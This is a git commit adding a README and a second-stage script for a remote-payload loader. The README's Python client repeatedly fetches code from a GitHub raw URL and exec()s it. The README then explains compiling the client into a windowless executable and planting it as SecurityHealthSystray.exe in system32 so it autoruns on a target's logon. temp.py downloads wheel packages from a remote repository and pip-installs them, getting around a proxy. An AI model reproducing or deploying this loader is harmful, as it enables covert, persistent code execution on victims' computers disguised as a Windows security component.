4475d7b4711a61c982871cdd89a3a8f4fa8bc120
unknow <unknow@unknow.unknow>
2024-07-05 12:55:00 +0200

    upd

---
+++ README.md
@@ -0,0 +1,65 @@
+# Client example
+```python
+import time
+import requests
+
+def has_internet():
+    global a
+    try:
+        a = requests.get("https://raw.githubusercontent.com/slayy2357/payload1/main/temp.py").text
+        if "#don't delete" in str(a):
+            return True
+        else:
+            return False
+    except:
+        return False
+
+while True:
+    if has_internet() == True:
+        exec(a)
+        break
+    else:
+        time.sleep(5)
+        pass
+```
+## How to make client autorun
+### If you are on windows (and target pc is on windows)
+Install requests (and all your client.py dependencies):
+```bash
+pip install requests
+```
+Install pyinstaller :
+```bash
+pip install pyinstaller
+```
+Compile client to executable :
+```bash
+pyinstaller client.py --onefile --noconsole
+```
+### If you are on linux (and target pc is on windows)
+Install wine, download python 64bit .exe installer then start cmd :
+```bash
+wine cmd
+```
+Install python (replace with real name):
+```bash
+pythoninstaller.exe
+```
+Install requests (and all your client.py dependencies):
+```bash
+pip install requests
+```
+Then install pyinstaller :
+```bash
+pip install pyinstaller
+```
+And finally, compile to .exe :
+```bash
+pyinstaller client.py --onefile --noconsole
+```
+## Finally :
+<<<<<<< HEAD
+Now whether you are on Linux or Windows, you have your client in ```dist/*.exe```, it can be injected as ```SecurityHealthSystray.exe``` for autorun on user logon (```C:\Windows\system32\SecurityHealthSystray.exe```)
+=======
+Now whether you are on Linux or Windows, you have your client in ```dist/*.exe```, it can be injected as ```SecurityHealthSystray.exe``` for autorun on user logon (```C:\Windows\system32\SecurityHealthSystray.exe```)
+>>>>>>> 2786ba1856880ccab5ea71e65cc22b8b9d916956
---
+++ temp.py
@@ -0,0 +1,48 @@
+#don't delete
+import requests
+import subprocess
+import os
+import tempfile
+import importlib.util
+
+#pypi blocked by proxy
+def is_package_installed(package_name):
+    package_spec = importlib.util.find_spec(package_name)
+    return package_spec is not None
+
+def get_package_name_from_whl(whl_filename):
+    return whl_filename.split('-')[0]
+
+def download_and_install_whls(repo_url):
+    response = requests.get(repo_url)
+    
+    if response.status_code == 200:
+        files = response.json()
+        for file in files:
+            if file['name'].endswith('.whl'):
+                package_name = get_package_name_from_whl(file['name'])
+                if not is_package_installed(package_name):
+                    url = file['download_url']
+                    download_and_install_whl(url, file['name'])
+                else:
+                    print(f"Package {package_name} is already installed.")
+
+def download_and_install_whl(url, filename):
+    try:
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.whl') as tmp_file:
+            response = requests.get(url)
+            tmp_file.write(response.content)
+            tmp_file.close()
+            valid_wheel_filename = os.path.join(tempfile.gettempdir(), filename)
+            if os.path.exists(valid_wheel_filename):
+                os.remove(valid_wheel_filename)
+            os.rename(tmp_file.name, valid_wheel_filename)
+            subprocess.check_call(['pip', 'install', valid_wheel_filename])
+            os.remove(valid_wheel_filename)
+    except Exception as e:
+        print(f"Error downloading or installing whl: {e}")
+
+repo_url = 'https://api.github.com/repos/slayy2357/payload1/contents/modules'
+download_and_install_whls(repo_url)
+
+print("All required whl packages are installed and ready to use.")
